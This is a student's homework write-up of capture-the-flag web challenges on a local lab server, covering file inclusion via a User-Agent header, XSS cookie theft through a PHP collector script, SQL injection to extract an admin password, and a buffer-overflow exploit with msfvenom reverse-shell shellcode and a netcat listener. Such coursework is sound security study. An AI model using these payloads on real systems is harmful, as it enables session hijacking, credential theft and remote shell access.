# Homework 6 - Blade CTF challenges

## Level 6

Level 6 tells you what browser you are using. Inspecting the PHP script, we can see that it reads the HTTP_USER_AGENT. If it is `safari` it opens `safari.php`, `firefox.php` if it is `firefox`. If its not either of those, it includes a file with the same name as the user agent. Therefore in order to open the required file, we can use the following curl command: `curl --location --request GET 'http://localhost:8080/~level06/cgi-bin/index.php' --header 'User-Agent: s3cr37.pwd'`

## Level 7

Level 7 has a login prompt, that saves the username and password inside a cookie. There is also a comments section which is vulnerable to XSS. The following PHP script can be used to steal the cookies:

```php
<?php
	$cookies = $_GET["c"];
	$file = fopen("/home/icyfire/public_html/cookie.txt", "a");
	fwrite($file, $cookies . "\n\n");
?>
```

We can inject some javascript in the following form to redirect the admin to this cookie stealing PHP script:

```javascript
<SCRIPT>window.location.href="/~icyfire/cookie.php?c=" + document.cookie</SCRIPT>
```

## Level 8

Playing around with the new user page in the blog, we can see that the field is vulnerable to SQL injection. On providing `xyz'` as username we can see that the SQL query used is: `SELECT * FROM users WHERE username='xyz''`. Using trial and error to find the right number of columns used for the SELECT query, we can use the following query to find the password for Zanardi: `xyz' UNION SELECT (SELECT password FROM users WHERE username='admin'),2,3,4,5,6 #`

## Level 9

The form sends username and data to a C CGI script called `parse`. Looking at the source code `parse.c` we see:

```c
data = getenv("QUERY_STRING");
...
pos = strchr(data, '&');
...
if (sscanf(data,"u=%s", u) != 1) {
...
if (sscanf(pos, "p=%s", p) != 1) {
...
```

Here we can see that the query parameters are read from the environment and parsed using `sscanf` function. Since there is no validation being done, this is vulnerable to buffer overflow. Using GDB we can find the exact position of the return address and overwrite it with the location of the shell code. The shell code can be sent along with the input as well. Since the CGI script stores everything in the environment, the shell code will be available in the environment as well. Since this is a web-based application, it will reject a lot of characters. Using the following script we can find all the bad characters rejected by the script.


```python
import socket
url = b"/~icyfire/cgi-bin/parse?u=AA&p="
out = ""
for i in range(256):
    char = chr(i)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1" , 80))
    http_request = b"GET " + url + char + b" HTTP/1.1\r\nHost: localhost\r\n\r\n"
    s.sendall(http_request)
    if "server could not understand" in s.recv(4096).decode():
        hex_chars = list(str(hex(ord(char))).replace('0x','\\x'))
        if len(hex_chars) == 3:
            hex_chars.insert(2, '0')
        out += ''.join(hex_chars)
    s.close()
print(out)
```

We are using python sockets in the above script to ensure that the bytes are sent as it is and are not URL encoded. Running the script we can see that the rejected characters are `\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x23\x7f`

We can then use Metasploit to generate shell code using the following command: `msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4321  -b "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x23\x7f" -f python`

Since the environment from GDB will be completely different from what is going to be in the actual environment, we can use a python script to find the right address to overwrite.

```python
import socket
from pwn import p32

host = "localhost"
port = 80
path = b"~level09/cgi-bin/parse"
query_string = b"?u=AA&p=ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

shellcode = b"\x90"*100 + b"\x89\xe5\xd9\xc1\xd9\x75\xf4\x5b\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x46\x51\x6b\x6b\x4c\x37\x5a\x43\x32\x73\x31\x53\x56\x33\x31\x7a\x57\x72\x4b\x39\x58\x61\x4c\x70\x71\x76\x7a\x6d\x6b\x30\x6d\x43\x63\x69\x6e\x50\x57\x4f\x58\x4d\x4f\x70\x62\x69\x54\x39\x4b\x49\x75\x38\x51\x6f\x65\x50\x45\x50\x73\x31\x43\x58\x43\x32\x73\x30\x74\x50\x58\x61\x4f\x79\x4d\x31\x48\x30\x71\x76\x32\x70\x43\x61\x31\x43\x4c\x73\x57\x73\x6f\x79\x4d\x31\x6a\x6d\x6b\x30\x53\x62\x53\x58\x42\x4e\x36\x4f\x62\x53\x53\x58\x43\x58\x36\x4f\x74\x6f\x32\x42\x62\x49\x4e\x69\x4b\x53\x71\x42\x46\x33\x4b\x39\x58\x61\x48\x30\x46\x6b\x7a\x6d\x6b\x30\x41\x41"

beg = 0xffffdbe6

for i in range(beg, beg + 1024):
    print(p32(i))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    url = query_string + p32(i) + shellcode
    request = b"POST /" + path  +  url + b" HTTP/1.1\r\nHost: localhost\r\n\r\n"
    s.connect((host, port))
    s.sendall(request)
    response = s.recv(4096)
    #print(response.decode())
    s.close()
```

Start a netcat listener using `nc -lvp 4321` and run the above script. Once we have the shell we can reveal the `oldlog.txt` file.

## Level 10

The webpage loads a java applet called `PacMan.class`. On opening the applet in a decompiler, we the following two strings in one of the classes: `KhniXck@pf}i` and ```E`vQl`Vbtc}```. On trying these, we find that these aren't the final answers. On further inspection of the applet class, we find a function named `decrString`. The function takes in a string as argument and modifies the string using the following formula: string[i] = string[i] - i if i is even string[i] = string[i] + i if i is odd. Applying the same modification on the two strings above, we get the final answers: `KillTheGhost` and `EatThePills`.